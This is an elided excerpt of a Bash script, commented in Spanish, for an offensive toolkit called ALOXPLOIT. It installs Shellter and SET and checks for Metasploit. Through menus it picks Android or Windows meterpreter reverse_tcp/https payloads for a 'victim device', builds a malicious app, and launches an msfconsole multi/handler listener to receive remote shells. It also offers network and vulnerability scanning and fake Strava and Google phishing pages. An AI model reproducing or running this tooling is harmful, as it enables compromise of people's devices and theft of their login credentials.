...
#service postgresql start >> /dev/null
	...
	which apache2 >/dev/null 2>&1 &&
  		echo "apache : Encontrado!" >> /dev/null || 
		echo "Instalando Apache..."
		apt-get install apache2 -y >> /dev/null

#EN ESTE APARTADO ME SALE UN ERROR QUE NO SE PUDO COMPLETAR POR PAQUETES ROTOS (el problema era porque tenia puesta la version y ya hay superiores)
	which mysql >/dev/null 2>&1 &&
		echo "mysql : Encontrado!" >> /dev/null  || 
	    	echo "Instalando Mysql"
		apt-get install mariadb-test mariadb-server mariadb-client -y >> /dev/null

	which php >/dev/null 2>&1 &&
		echo "php : Encontrado!" >> /dev/null || 
		echo "Instalando Php..."
		apt-get install php libapache2-mod-php php-mysql -y >> /dev/null

	which xterm >/dev/null 2>&1 && 
    		echo "xterm : Encontrado!" >> /dev/null || 
		echo "Instalando Xterm..."
    		apt-get install xterm -y >> /dev/null

	which shellter >/dev/null 2>&1 && 
    		echo "shellter : Encontrado!" >> /dev/null || 
		echo "Instalando Shellter..."
    		apt-get install shellter -y >> /dev/null

# ERROR, NO APARECE NI EL MENU, SE QUEDA PILLADO (arreglado)
	which setoolkit >/dev/null 2>&1 && 
		 echo "setoolkit : Encontrado!" >> /dev/null || 
   		 echo "Instalando SET" 
		apt-get install set -y >> /dev/null

	which msfconsole >/dev/null 2>&1 && 
   		echo "metasploit : Encontrado!" >> /dev/null || 
  		echo "Debes instalar metasploit-framework"
...
mysql -u root -BNe 'USE aloxploitDatabase' > /dev/null 2> /dev/null
	...
	if [ $? -eq 0 ]
	then
		echo "Los datos recogidos por aloxploit se guardaran en aloxploiDatabase"
	else
...
dispositivo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Android" FALSE "Windows" --width 350 --height 200 2> /dev/null`
...
then
	...
	echo ""
	payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "seleccion" --column "Opciones" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_https" --width 400 --height 300 2> /dev/null`
...
then
	...
	echo ""
payload=`zenity --title "ALOXPLOIT" --list --text "¿Qué payload desea?" --radiolist --column "Seleccion" --column "Opciones" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_https" --width 400 --height 300 2> /dev/null`
...
elif [ $dispositivo -eq 3 ]
then
	echo "Ha elegido Linux"
else
#aqui deberia poner un elif y hace un bucle, si no elije la correcta la vuelve a pedir
	echo "opcion erronea"
	exit
fi

#aqui podria coger la ip yo directamente, en principio que la ponga el usuario
        ip2=`zenity --title " ALOXPLOIT" --text "Selecciona la ip de escucha (tu ip)" --entry --entry-text $ip --width 300 2> /dev/null`
...
echo " "
echo -e "$amarillo --- Resumen del payload creado --- $fincolor"
echo "$payload"
echo "$nombre"
echo "$ip"
echo "$puerto"
...
tipo=`zenity --title "ALOXPLOIT" --list --text "Dispositivo victima" --radiolist --column "seleccion"  --column "Opciones" TRUE "Windows" FALSE "Android" --width 350 --height 200 2> /dev/null`
	...
	# TODO OK, aqui puedo redireccionar el jarsinger para que no llene la pantalla (si eso probarlo)
		...
		echo "------------------------------------------------------"
		echo "Aplicacion creada en ${path}/appmaliciosa"
		echo "------------------------------------------------------"
		fi
...
then
	auto=`zenity --title "ALOXPLOIT" --list --text "¿Como quiere trabajar con metasploit?" --radiolist --column "seleccion" --column "opciones"  TRUE "Automatico" FALSE "Manual" --width 350 --height 200 2> /dev/null`
	...
	echo " arrancando metasploit..."
	echo ""
	 #arrancamos msf console para poner en escucha
	xterm -e "msfconsole -x 'use multi/handler; set LHOST $ip2; set LPORT $puerto; set payload $payload; exploit'"
...
then 
	...
	escaneo=`zenity --title "ALOXPLOIT" --list --text "Tipo de escaneo" --radiolist --column "seleccion"  --column "Opciones" TRUE "Escaneo de puertos y SO de la red" FALSE "Escaneo de vulnerabilidades" FALSE "Escaneo de directorios" --width 400 --height 400 2> /dev/null`
...
then
	...
	phishing=`zenity --title "ALOXPLOIT" --list --text "Elije un programa" --radiolist --column "seleccion"  --column "Opciones" TRUE "Aloxploit" FALSE "Setoolkit" --width 400 --height 400 2> /dev/null`

	if [ $phishing = "Aloxploit" ]
	then
	systemctl start apache2
	web=`zenity --title "ALOXPLOIT" --list --text "Elije web para phishing" --radiolist --column "seleccion"  --column "Opciones" TRUE "Strava" FALSE "Google" --width 400 --height 400 2> /dev/null`
	red=`zenity --title "ALOXPLOIT" --list --text "Elije si está dentro de su red" --radiolist --column "seleccion"  --column "Opciones" TRUE "Interna" FALSE "Externa" --width 400 --height 400 2> /dev/null`
